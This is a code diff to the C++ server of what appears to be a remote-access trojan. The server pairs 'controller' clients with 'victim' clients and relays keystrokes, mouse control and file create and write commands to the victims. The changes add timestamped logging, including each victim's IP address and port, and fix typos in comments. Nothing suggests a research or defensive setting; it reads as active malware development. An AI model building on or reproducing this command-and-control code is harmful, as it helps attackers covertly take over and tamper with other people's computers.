@@ -8,7 +8,12 @@ Server::Server()
 		std::exit(-1);
 	}	
 	selector.add(listener);
-	std::cout << "listening on port " << SERVER_PORT << "\n";
+
+	std::ofstream log("./log.txt", std::ios::app);
+	auto t = std::chrono::duration_cast<std::chrono::seconds>(std::chrono::system_clock::now().time_since_epoch()).count();
+	log << t << " - started listening on port " << SERVER_PORT << "\n";
+	std::cout << t << " - started listening on port " << SERVER_PORT << "\n";
+	log.close();
 
 	//start thread that checks if client are not asleep
 	std::thread checkAwakeThread(&Server::checkAwake, this);
@@ -36,7 +41,12 @@ void Server::receive()
 
 		//disconnect client
 		if (p.getDataSize() == 0) {
-			std::cout << "disconnected - ";
+			std::ofstream log("./log.txt", std::ios::app);
+			auto t = std::chrono::duration_cast<std::chrono::seconds>(std::chrono::system_clock::now().time_since_epoch()).count();
+			log << t << " - " << c.first << " disconnected\n";
+			std::cout << t << " - " << c.first << " disconnected\n";
+			log.close();
+
 			disconnect(c.first);
 			break;
 		}
@@ -64,12 +74,18 @@ void Server::receive()
 					p << sf::Uint16(c.first);
 				//tell the client that it has been initialized
 				c.second.socket->send(p);
-				c.second.role = role;
-				std::cout << "new " << role << " - id: " << c.first << "\n";
+				c.second.role = role;			
+				
+				std::ofstream log("./log.txt", std::ios::app);
+				auto t = std::chrono::duration_cast<std::chrono::seconds>(std::chrono::system_clock::now().time_since_epoch()).count();
+				auto add = c.second.socket->getRemoteAddress().toString() + ":" + std::to_string(c.second.socket->getRemotePort());
+				std::cout << t << " - " << c.first << " = new " << role << " - " << add << "\n";
+				log << t << " - " << c.first << " = new " << role << " - " << add << "\n";
+				log.close();	
 
 				updateControllersList();
 			}
-			//tell the client that the command received wasnt valid
+			//tell the client that the command received wasn't valid
 			else {
 				p << sf::Uint8('?');
 				c.second.socket->send(p);
@@ -77,7 +93,12 @@ void Server::receive()
 		}
 	}
 	for (const auto id : idsToKill) {
-		std::cout << "killed - ";
+		std::ofstream log("./log.txt", std::ios::app);
+		auto t = std::chrono::duration_cast<std::chrono::seconds>(std::chrono::system_clock::now().time_since_epoch()).count();
+		log << t << " - " << id << " killed\n";
+		std::cout << t << " - " << id << " killed\n";
+		log.close();
+
 		disconnect(id);
 	}
 
@@ -89,7 +110,7 @@ void Server::receive()
 			selector.add(*c.socket);
 			clients.insert({ ++currentId, c });
 		}
-		//undo if client isnt accepted successfully
+		//undo if client isn't accepted successfully
 		else {
 			delete c.socket;
 			currentId--;
@@ -111,7 +132,12 @@ void Server::checkAwake()
 
 		//disconnect afk clients
 		for (auto id : idsToRemove) {
-			std::cout << "timed out - ";
+			std::ofstream log("./log.txt", std::ios::app);
+			auto t = std::chrono::duration_cast<std::chrono::seconds>(std::chrono::system_clock::now().time_since_epoch()).count();
+			log << t << " - " << id << " timed out\n";
+			std::cout << t << " - " << id << " timed out\n";
+			log.close();
+
 			disconnect(id);
 		}
 		mutex.unlock();
@@ -133,7 +159,7 @@ void Server::processControllerMsg(sf::Uint16 id, sf::Packet p, std::vector<sf::U
 		//controller is already paired
 		if (clients[id].pair != 0)
 			return;
-		//other client doesnt exist
+		//other client doesn't exist
 		if (clients.find(vId) == clients.end())
 			return;
 		//other client is not a victim or is already paired
@@ -152,7 +178,7 @@ void Server::processControllerMsg(sf::Uint16 id, sf::Packet p, std::vector<sf::U
 		updateControllersList();
 	}
 	//forward events to victim
-	//key-pressed, key-released, mouse moved, wheel scrolled, start-stop keyboard controll, start-stop mouse control, create-write-close file
+	//key-pressed, key-released, mouse moved, wheel scrolled, start-stop keyboard control, start-stop mouse control, create-write-close file
 	else if (cmd == 'm' || cmd == 'n' || cmd == 'l' || cmd == 'k' || cmd == 'a' || cmd == 'z' || 
 		cmd == 's' || cmd == 'x' || cmd == 'f' || cmd == 'o' || cmd == 'i' || cmd == 'h') {
 
@@ -193,10 +219,10 @@ void Server::processControllerMsg(sf::Uint16 id, sf::Packet p, std::vector<sf::U
 		sf::Uint16 oId;
 		p >> oId;
 
-		//client doesnt exist
+		//client doesn't exist
 		if (clients.find(oId) == clients.end())
 			return;
-		//client isnt initialized
+		//client isn't initialized
 		if (clients[oId].role == '-')
 			return;
 
@@ -213,10 +239,10 @@ void Server::processControllerMsg(sf::Uint16 id, sf::Packet p, std::vector<sf::U
 		std::string name;
 		p >> oId >> name;
 
-		//client doesnt exist
+		//client doesn't exist
 		if (clients.find(oId) == clients.end())
 			return;
-		//client isnt initialized
+		//client isn't initialized
 		if (clients[oId].role == '-')
 			return;
 
@@ -259,7 +285,6 @@ void Server::processVictimMsg(sf::Uint16 id, sf::Packet p)
 void Server::disconnect(sf::Uint16 id)
 {
 	if (clients.find(id) == clients.end()) {
-		std::cout << "no one\n";
 		return;
 	}
 
@@ -298,7 +323,6 @@ void Server::disconnect(sf::Uint16 id)
 	delete clients[id].socket;
 	clients.erase(id);
 
-	std::cout << "id: " << int(id) << "\n";
 	updateControllersList();
 }
 void Server::updateControllersList()
@@ -319,7 +343,7 @@ void Server::updateControllersList()
 
 	//send to controllers each client info
 	for (const auto& c : clients) {
-		//skip if client isnt initialized
+		//skip if client isn't initialized
 		if (c.second.role == '-')
 			continue;
 
